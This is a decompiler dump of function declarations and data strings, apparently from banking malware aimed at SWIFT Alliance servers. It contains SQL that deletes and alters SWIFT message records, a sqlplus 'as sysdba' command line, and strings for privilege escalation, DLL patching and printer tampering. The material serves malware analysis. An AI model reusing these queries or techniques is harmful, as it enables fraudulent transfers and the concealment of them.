/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2017 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

FILE *sub_401000(char *Format, ...);
void sub_4010D0();
void *__cdecl sub_401290(LPCSTR lpFileName, int a2);
DWORD __cdecl sub_401320(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, char a4);
int __cdecl sub_4013B0(LPCSTR lpFileName, int); // idb
DWORD __cdecl sub_401440(LPCSTR lpString);
DWORD __cdecl sub_4014F0(LPCSTR lpString);
DWORD __cdecl sub_401550(LPCSTR lpExistingFileName, char a2);
DWORD __cdecl sub_401640(LPCSTR lpFileName);
HANDLE __cdecl sub_401780(char *Dir, char *Filename);
DWORD __cdecl sub_401860(LPCSTR lpExistingFileName);
DWORD __cdecl sub_401870(char *Dir);
int __cdecl sub_4019F0(char *FullPath, char *Dir, char *, char); // idb
_DWORD *__cdecl sub_401B10(_DWORD *a1);
DWORD __cdecl sub_401C30(LPSTR lpCommandLine);
int __cdecl sub_401CD0(LPCSTR lpFirst, int a2);
int __cdecl sub_401E40(LPCSTR lpFileName, int); // idb
int __cdecl sub_401E90(char *Str, int, int); // idb
int __cdecl sub_401EB0(char *Str, int, int, char, char); // idb
bool __cdecl sub_402080(LPCSTR lpFirst, LPCSTR lpSrch);
int __cdecl sub_4020A0(LPCSTR lpFirst, int); // idb
char *__cdecl sub_4020F0(int a1, int a2, char *a3, size_t Count);
__int64 __cdecl sub_402270(char *Src);
signed int __cdecl sub_4023B0(int a1, _DWORD *a2, _DWORD *a3, int a4);
int __cdecl sub_402580(HANDLE hProcess, int Buffer, int); // idb
int __cdecl sub_402660(LPCSTR lpName, int); // idb
_DWORD *__fastcall sub_402710(int a1);
int sub_402750();
signed int __cdecl sub_4027C0(int a1, int a2, int a3, int a4);
signed int __cdecl sub_402900(int a1, int a2, int a3);
int __cdecl sub_402A40(int, int, char *Source, int, int); // idb
int __cdecl sub_402C90(int, int, int, int, char *Source, int, int); // idb
int __cdecl sub_402D70(int, int, int, int, char *Source, int, int); // idb
void sub_402E80(char *Format, ...);
void __cdecl sub_403020(char *Dest, int a2);
int __cdecl sub_403150(char *FullPath); // idb
int __cdecl sub_4031D0(int a1, int a2);
int __cdecl sub_403230(char *Dir); // idb
int __cdecl sub_4032F0(char *Dir); // idb
DWORD __cdecl sub_4033E0(int a1, LPCSTR lpString);
signed int __cdecl sub_403800(int a1, int a2, int a3, int a4);
int __cdecl sub_403CD0(LPCSTR lpFileName, int); // idb
int __cdecl sub_403EB0(char *Dir, char *Filename); // idb
int __cdecl sub_404070(char *Dir); // idb
int sub_4041B0();
int __cdecl sub_4041C0(LPCSTR lpFileName, int); // idb
int __cdecl sub_4042A0(char *Dir); // idb
int sub_4043E0();
signed int __cdecl sub_404410(char *Str, int a2);
int __cdecl sub_4045C0(char *Str, int); // idb
signed int __cdecl sub_404800(char *FullPath, char a2, const char *a3);
int __cdecl sub_4053C0(char a1);
int __cdecl sub_4054F0(char *, int, int, int, int); // idb
signed int __cdecl sub_405A30(int a1, unsigned int *a2);
signed int __cdecl sub_405BE0(int a1, char a2, int a3, int a4, char *Str);
signed int __cdecl sub_406050(int a1, char a2, int a3, int a4, int a5, int a6, char *Str);
signed int __cdecl sub_406490(int a1, int a2, __int64 a3);
signed int __cdecl sub_406810(int a1, int a2, int a3, int a4, int *a5, __int64 *a6);
int __cdecl sub_406B40(char *Str, int); // idb
signed int __cdecl sub_406D80(int a1, int a2, char a3, const char *a4);
int __cdecl sub_408260(char *Dir, int); // idb
int sub_408390();
int __cdecl sub_4083E0(LPCSTR lpFileName, char *Dest); // idb
int __cdecl sub_4084C0(char *Str2); // idb
int __cdecl sub_408550(char *lpFirst, _DWORD *a2, char *a3, unsigned int a4);
int __cdecl sub_4086E0(char *Dir); // idb
int sub_408B50();
int __cdecl sub_408B70(int, LPCSTR lpFirst, int); // idb
bool __cdecl sub_408E00(int a1);
bool __cdecl sub_408EA0(int a1);
DWORD __cdecl sub_408F40(int a1);
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
bool sub_409230();
SC_HANDLE __cdecl sub_4092B0(LPCSTR lpServiceName);
void __cdecl __noreturn sub_409300(HMODULE hModule); // idb
DWORD __cdecl sub_409460(LPSTR pPrinterName, DWORD Command, LPBYTE pPrinter);
DWORD __cdecl sub_409530(LPSTR pPrinterName);
// void __cdecl __noreturn _exit(int);
DWORD __cdecl sub_409570(LPSTR pPrinterName);
DWORD __cdecl sub_409590(LPSTR pPrinterName);
int __cdecl sub_4095B0(LPSTR pPrinterName); // idb
DWORD __cdecl sub_4097E0(char *Dir, LPCSTR lpExistingFileName);
DWORD __cdecl sub_409920(char *Dir);
int __stdcall sub_409AF0(int a1);
BOOL __cdecl sub_409CB0(DWORD a1, DWORD a2, DWORD a3);
void __stdcall HandlerProc(DWORD dwControl); // idb
int __stdcall sub_409D60(int a1, int a2);
int __cdecl main(int argc, const char **argv, const char **envp);
int __thiscall sub_40A0E0(_DWORD *this);
_DWORD *__thiscall sub_40A140(_DWORD **this, _DWORD *a2);
_DWORD *__thiscall sub_40A150(_DWORD *this, _DWORD *a2, _DWORD *a3, char *a4);
int __thiscall sub_40A1B0(_DWORD *this, int a2, void *Memory);
int __thiscall sub_40A220(_DWORD *this, int a2, void *Memory, int a4);
_DWORD *__stdcall sub_40A2B0(_DWORD *a1, int a2);
void __cdecl sub_40A2E0(int a1, char *a2);
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(void *Memory, char); idb
int __cdecl sub_40A4C0(const char *a1, void *a2, unsigned int a3);
unsigned int __cdecl sub_40A5A0(int a1, int a2, char *Dest, int a4);
__int64 __cdecl sub_40A6D0(char *a1);
int __cdecl sub_40A7A0(int, int, char *Dest, int); // idb
int __cdecl sub_40A830(char *Str, char *SubStr, int, char *Dest, int); // idb
int __cdecl sub_40A8D0(int, int, char *Str, char *Dest, int); // idb
signed int __cdecl sub_40A9A0(int a1, int *a2, int a3, const char *a4, int a5);
signed int __cdecl sub_40AD70(int a1, int *a2, char *Str, char *Dest, int a5);
signed int __cdecl sub_40B280(int a1, int *a2, char *Str, char *a4, int a5);
signed int __cdecl sub_40B550(int a1, int *a2, char *Str, char *Dest, int a5);
int __cdecl sub_40B6F0(char *Source, char *Dest, int); // idb
_BYTE *__cdecl sub_40BAB0(int a1, int a2, int a3);
void __cdecl sub_40BB20(int a1, int a2, _BYTE *a3, int a4);
void __cdecl sub_40BBC0(int a1, int a2, _BYTE *a3, int a4);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Module32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// BOOL __stdcall Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall ClosePrinter(HANDLE hPrinter);
// BOOL __stdcall SetPrinterA(HANDLE hPrinter, DWORD Level, LPBYTE pPrinter, DWORD Command);
// BOOL __stdcall OpenPrinterA(LPSTR pPrinterName, LPHANDLE phPrinter, LPPRINTER_DEFAULTSA pDefault);
// BOOL __stdcall EnumJobsA(HANDLE hPrinter, DWORD FirstJob, DWORD NoJobs, DWORD Level, LPBYTE pJob, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned);
void __cdecl sub_40BC56(void *Memory);
// void __cdecl free(void *Memory);
// void *__cdecl operator new(unsigned int); idb
// int _CxxFrameHandler(void); weak
int sub_40BFD4();
int SEH_402E80();
int SEH_403020();
int SEH_403800();
int SEH_403CD0();
int SEH_404410();
int SEH_4045C0();
int SEH_404800();
int SEH_4054F0();
int SEH_405A30();
int SEH_405BE0();
int SEH_406050();
int SEH_406490();
int SEH_406810();
int SEH_406B40();
int SEH_406D80();
int SEH_408550();
int SEH_4086E0();
int SEH_40A2E0();
// SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// BOOL __stdcall DeleteService(SC_HANDLE hService);
// BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// BOOL __stdcall ConvertSidToStringSidA(PSID Sid, LPSTR *StringSid);
// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorA(LPCSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// SERVICE_STATUS_HANDLE __stdcall RegisterServiceCtrlHandlerA(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc);
// BOOL __stdcall StartServiceCtrlDispatcherA(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject);
// int __stdcall lstrlenA(LPCSTR lpString);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// BOOL __stdcall RemoveDirectoryA(LPCSTR lpPathName);
// BOOL __stdcall MoveFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName);
// BOOL __stdcall GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// BOOL __stdcall FlushFileBuffers(HANDLE hFile);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// DWORD __stdcall GetFileAttributesA(LPCSTR lpFileName);
// BOOL __stdcall WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// BOOL __stdcall ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// BOOL __stdcall VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// UINT __stdcall GetTempFileNameA(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);
// DWORD __stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
// BOOL __stdcall FileTimeToSystemTime(const FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall GetLastError();
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// BOOL __stdcall CreateDirectoryA(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Split(_DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(_DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::max_size(_DWORD); weak
// void __cdecl std::_Xlen(); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Copy(_DWORD, _DWORD); weak
// int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD); weak
// int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD); weak
// void __cdecl std::_Xran(); weak
// void *__cdecl malloc(size_t Size);
// char *__cdecl strstr(const char *Str, const char *SubStr);
// char *__cdecl strncat(char *Dest, const char *Source, size_t Count);
// int __cdecl fclose(FILE *File);
// int fprintf(FILE *File, const char *Format, ...);
// FILE *__cdecl fopen(const char *Filename, const char *Mode);
// int __cdecl vsnprintf(char *DstBuf, size_t MaxCount, const char *Format, va_list ArgList);
// void __cdecl makepath(char *Path, const char *Drive, const char *Dir, const char *Filename, const char *Ext);
// int sprintf(char *Dest, const char *Format, ...);
// void __cdecl free(void *Memory);
// char *__cdecl strrchr(const char *Str, int Ch);
// char *__cdecl strdup(const char *Src);
// int __cdecl rand();
// void __cdecl splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext);
// int snprintf(char *Dest, size_t Count, const char *Format, ...);
// void *__cdecl calloc(size_t NumOfElements, size_t SizeOfElements);
// char *__cdecl strchr(const char *Str, int Val);
// int sscanf(const char *Src, const char *Format, ...);
// int __cdecl isdigit(int C);
// char *__cdecl strncpy(char *Dest, const char *Source, size_t Count);
// int __cdecl strtol(const char *Str, char **EndPtr, int Radix);
// int __cdecl stricmp(const char *Str1, const char *Str2);
// int __cdecl strnicmp(const char *Str1, const char *Str, size_t MaxCount);
// int __cdecl access(const char *, int);
// int __cdecl atoi(const char *Str);
// time_t __cdecl static time(time_t *Time);
// int printf(const char *Format, ...);
// void *__cdecl memmove(void *Dst, const void *Src, size_t Size);
// LPSTR __stdcall StrStrIA(LPCSTR lpFirst, LPCSTR lpSrch);
// BOOL __stdcall PathMatchSpecA(LPCSTR pszFile, LPCSTR pszSpec);
// BOOL __stdcall StrTrimA(LPSTR psz, LPCSTR pszTrimChars);
// BOOL __stdcall HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// BOOL __stdcall HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
// BOOL __stdcall InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
// BOOL __stdcall InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
// HINTERNET __stdcall HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// BOOL __stdcall InternetCloseHandle(HINTERNET hInternet);
// HINTERNET __stdcall InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// HINTERNET __stdcall InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);

//-------------------------------------------------------------------------
// Data declarations

// extern _UNKNOWN std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos; weak
// extern _UNKNOWN `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C; weak
_UNKNOWN unk_40F020; // weak
char Format[] = "[%02d:%02d:%02d] %s\r\n"; // idb
char Mode[] = "at+"; // idb
char Source[] = "\n"; // idb
char aRecasDat[] = "recas.dat"; // idb
char aGpcaDat[] = "gpca.dat"; // idb
char aMcm[] = "mcm"; // idb
char aFoff[] = "foff"; // idb
char aFofp[] = "fofp"; // idb
char aNfzf[] = "nfzf"; // idb
char aNfzp[] = "nfzp"; // idb
char aMcs[] = "mcs"; // idb
char aUnk[4] = "unk"; // idb
char aOut[4] = "out"; // idb
char aIn[3] = "in"; // idb
char aMcp[4] = "mcp"; // idb
char aMcf[4] = "mcf"; // idb
char aCUsersSAppdata[] = "%c:\\Users\\%s\\AppData\\Local\\%s"; // idb
char aAdministrator[14] = "Administrator"; // weak
char aAllians[8] = "Allians"; // weak
char asc_40F0DC[] = ".."; // idb
char Str2[] = "."; // idb
char Ext[] = "*"; // idb
char aDAOiciGaCoAOic[] = "D:(A;OICI;GA;;;CO)(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GA;;;%s)"; // idb
CHAR Srch[] = ".\\\"  _DO_NOT_USE_MM_"; // idb
char aS_0[] = "%s."; // idb
char aS2d[] = "%s.%.2d"; // idb
char a000[5] = "0.00"; // weak
char a3d[] = ",%.3d"; // idb
char aI64d[] = "%I64d"; // idb
CHAR pszTrimChars[] = "\r\n# "; // idb
_UNKNOWN unk_40F170; // weak
_UNKNOWN unk_40F174; // weak
char aFailS[] = "FAIL : %s"; // idb
char aOkS[] = "OK : %s"; // idb
CHAR aLiboradbDll[] = "liboradb.dll"; // idb
CHAR Name[] = "SeDebugPrivilege"; // idb
char aDeleteFromSaao_0[] = "DELETE FROM SAAOWNER.TEXT_%s WHERE TEXT_S_UMID = '%s';"; // idb
char aDeleteFromSaao[] = "DELETE FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID = '%s';"; // idb
char aSelectCTextSUm[] = "SELECT C.TEXT_S_UMID FROM (SELECT A.TEXT_S_UMID, A.TEXT_DATA_BLOCK FROM SAAOWNER.TEXT_%s A, SAAOWNER.MESG_%s B WHERE A.TEXT_S_UMID = B.MESG_S_UMID AND B.MESG_SENDER_SWIFT_ADDRESS LIKE '%%%s%%' AND (A.TEXT_DATA_BLOCK LIKE '%%%d/%d%%' OR A.TEXT_DATA_BLOCK LIKE '%%%d/%.5d%%')) C WHERE ROWNUM = 1;"; // idb
char aSelectMesgSUmi[] = "SELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE '%%%s%%' AND MESG_TRN_REF LIKE '%%%s%%';"; // idb
char aUpdateSaaowner_0[] = "UPDATE SAAOWNER.TEXT_%s SET TEXT_DATA_BLOCK = UTL_RAW.CAST_TO_VARCHAR2('%s') WHERE TEXT_S_UMID = '%s';"; // idb
char aUpdateSaaowner[] = "UPDATE SAAOWNER.MESG_%s SET MESG_FIN_CCY_AMOUNT = '%s' WHERE MESG_S_UMID = '%s';"; // idb
char aS19s[] = "%s%19s"; // idb
char aSelectMesgFinC[] = "SELECT MESG_FIN_CCY_AMOUNT FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID = '%s';"; // idb
char aSelectMesgSUmi_0[] = "SELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE '%%%s%%' AND MESG_FIN_CCY_AMOUNT LIKE '%%%s%%';"; // idb
char aS_1[] = "%s"; // idb
char a04d[] = "%04d"; // idb
char asc_40F55C[] = "????????"; // idb
char aPrt_0[] = "prt"; // idb
char aSBak[] = "%s.bak"; // idb
char aSSS[] = "%s \"%s\" %s"; // idb
char aSSS21[18] = "%s \"%s\" \"%s\" 2 -1"; // weak
char aBpEveryNextMes[48] = ".bp\t\\\" Every next message starts at a new page\n"; // weak
char aWh0PhTrapAtLin[70] = ".wh 0 PH\t\\\" Trap at line 0 (top of each page). Print the page header\n"; // weak
char a06d[] = "%06d"; // idb
char a02d02d02d02d02[] = "%02d/%02d/%02d-%02d:%02d:%02d"; // idb
char aRedefinitionOf[60] = ".\\\" Redefinition of the Page Header for every next message\n"; // weak
char aDefinitionOfTh[57] = ".\\\" Definition of the Page Header for the first message\n"; // weak
char asc_40F6AC[3] = ".\n"; // weak
char asc_40F6B0[5] = ".\\\"\n"; // weak
CHAR pszSpec[] = "????????.prt"; // idb
CHAR asc_40F6C8[] = " \r\n"; // idb
CHAR aSender[] = "Sender   : "; // idb
CHAR a16rStartOfBloc[] = "16R: Start of Block"; // idb
char a001604dPrt[] = "0016%04d.prt"; // idb
char aIncoming[11] = "\\Incoming\\"; // weak
char aI64d02d[] = "     %I64d,%02d\n"; // idb
CHAR a90bPrice[] = "90B: Price"; // idb
char aAmount27s[] = "     Amount         :%27s\n"; // idb
char asc_40F744[2] = "#"; // weak
CHAR aAmount_0[] = "Amount"; // idb
CHAR a19aAmount[] = "19A: Amount"; // idb
CHAR aAmount[] = "Amount         :"; // idb
CHAR aSender_0[] = "Sender   :"; // idb
CHAR aDebit[] = ": Debit"; // idb
CHAR aDebitCredit[] = "Debit/Credit   :"; // idb
CHAR dword_40F798[] = { ' ', ' ', ' ', ' ' }; // idb
CHAR aC[] = "    C"; // idb
CHAR aD[] = "    D"; // idb
char aDebitCreditS[] = "     Debit/Credit   : %s\n"; // idb
char aDebit_0[6] = "Debit"; // weak
char aCredit[] = "Credit"; // idb
CHAR a62m[] = "62M: "; // idb
CHAR a62f[] = "62F: "; // idb
CHAR a60m[] = "60M: "; // idb
CHAR a60f[] = "60F: "; // idb
CHAR a64[] = " 64: "; // idb
CHAR aRpPurchase[] = "RP Purchase"; // idb
CHAR a20Transaction_0[] = " 20: Transaction"; // idb
CHAR PrefixString[] = "ALI"; // idb
char aCI64d[] = "%c:%I64d"; // idb
char Str[] = "FEDERAL RESERVE BANK"; // idb
char aSDDS[] = "%s\\%d_%d-%s"; // idb
char aD_0[] = "%d_*-*"; // idb
char a1[] = "*_1-*"; // idb
char a04d02d02d[] = "%04d%02d%02d"; // idb
char aRefidS[] = "REFID: %s"; // idb
CHAR asc_40F88C[] = " \r\n\t"; // idb
CHAR a20Transaction[] = "20: Transaction"; // idb
CHAR aFin900Confirma[] = "FIN 900 Confirmation of Debit"; // idb
char aFal_0[5] = ".fal"; // weak
char aPrc_0[5] = ".prc"; // weak
CHAR aFal[] = "*.fal"; // idb
CHAR aPrc[] = "*.prc"; // idb
CHAR aError[] = "Error"; // idb
char aCmdExeCEchoExi[] = "cmd.exe /c echo exit | \"%s\" -S / as sysdba @%s > \"%s\""; // idb
char aS[] = "%s\r\n"; // idb
char aSetVerifyOff[] = "SET VERIFY OFF;\r\n"; // idb
char aSetFeedOff[] = "SET FEED OFF;\r\n"; // idb
char aSetEchoOff[] = "SET ECHO OFF;\r\n"; // idb
char aSetFeedbackOff[] = "SET FEEDBACK OFF;\r\n"; // idb
char aSetLinesize325[] = "set linesize 32567;\r\n"; // idb
char aSetHeadingOff[] = "set heading off;\r\n"; // idb
char aWt[] = "wt"; // idb
CHAR aTmp[4] = "TMP"; // idb
CHAR aSql[4] = "SQL"; // idb
CHAR aLogin[] = "Login"; // idb
char aSelectFromSele[] = "SELECT * FROM (SELECT JRNL_DISPLAY_TEXT, JRNL_DATE_TIME FROM SAAOWNER.JRNL_%s WHERE JRNL_DISPLAY_TEXT LIKE '%%LT BBHOBDDHA: Log%%' ORDER BY JRNL_DATE_TIME DESC) A WHERE ROWNUM = 1;"; // idb
CHAR aLogout[] = "Logout"; // idb
CHAR szVerb[] = "GET"; // idb
CHAR szVersion[] = "HTTP/1.1"; // idb
char aSS_0[] = "/%s?%s"; // idb
char aAl[3] = "al"; // weak
char aN[5] = "---N"; // weak
char aC_0[5] = "---C"; // weak
char aO[5] = "---O"; // weak
char aSS[] = "\"%s\" \"%s\""; // idb
char aEvtsysExe[11] = "evtsys.exe"; // weak
char aControllingSSu[] = "Controlling \"%s\" success.\n"; // idb
char aFailedToContro[] = "Failed to control printer. cmd=%d, err=%d\n"; // idb
char aFailedToOpenPr[] = "Failed to open printer. err=%d\n"; // idb
char aSubmitted04d02[] = "Submitted : %04d-%02d-%02d %02d:%02d:%02d\n"; // idb
char aPositionD[] = "Position : %d\n"; // idb
char aPriorityD[] = "Priority : %d\n"; // idb
char aPagesprintedD[] = "PagesPrinted : %d\n"; // idb
char aTotalpagesD[] = "TotalPages : %d\n"; // idb
char aStatusD[] = "Status : %d\n"; // idb
char aDatatypeS[] = "DataType : %s\n"; // idb
char aDocumentS[] = "Document : %s\n"; // idb
char aUsernameS[] = "UserName : %s\n"; // idb
char aJobIdD[] = "Job ID : %d\n"; // idb
char asc_40FBEC[] = "======================================================="; // idb
char aJobCountD[] = "Job Count : %d\n"; // idb
char aFailedToEnumjo_0[] = "Failed to enumjobs.err=%d\n"; // idb
char aFailedToEnumjo[] = "Failed to enumjobs. err=%d\n"; // idb
char aMoveSSFailedEr[] = "move(%s,%s) failed. err= %d"; // idb
char aSuccess[] = "success"; // idb
char aErrorRnoffAlre[] = "error. rnoff already exist"; // idb
char aRnoff[] = "rnoff"; // idb
char aNroff[] = "nroff"; // idb
char aExe[] = "exe"; // idb
char aErrorFileNotFo[] = "error. file not found."; // idb
char aErrorBackupFil[33] = "error. backup file alreay exist."; // weak
char aBak[5] = ".bak"; // weak
CHAR ServiceName[] = "diagsysevt"; // idb
char aSt100[] = "ST-100"; // idb
char aSt3[] = "ST-3"; // idb
char aSt2[] = "ST-2"; // idb
char aSt1[] = "ST-1"; // idb
char aSt0E[] = "ST-0-E"; // idb
char aPuDD[] = "PU (%d, %d)"; // idb
char aU[] = "-u"; // idb
char aPiDD[] = "PI (%d, %d)"; // idb
char aI[] = "-i"; // idb
char aT[3] = "-t"; // idb
char aOpened[] = "opened\n"; // idb
char aClosed[] = "closed\n"; // idb
char aG[] = "-g"; // idb
char aR[3] = "-r"; // idb
char aS_2[3] = "-s"; // idb
char aLogpathS[] = "LogPath= %s\n"; // idb
char aCfgOkS[] = "CFG OK(%s)\n"; // idb
char aCfgFailS[] = "CFG FAIL(%s)\n"; // idb
char aQueue[] = "queue"; // idb
char aOff[] = "off"; // idb
char aOn[3] = "on"; // idb
char aPause[] = "pause"; // idb
char aResume[] = "resume"; // idb
char aP[] = "-p"; // idb
char aSvc[] = "-svc"; // idb
char a2x[] = "%.2X"; // idb
char asc_40FDD8[] = "'||\r\n'"; // idb
char asc_40FDE0[2] = "\r"; // weak
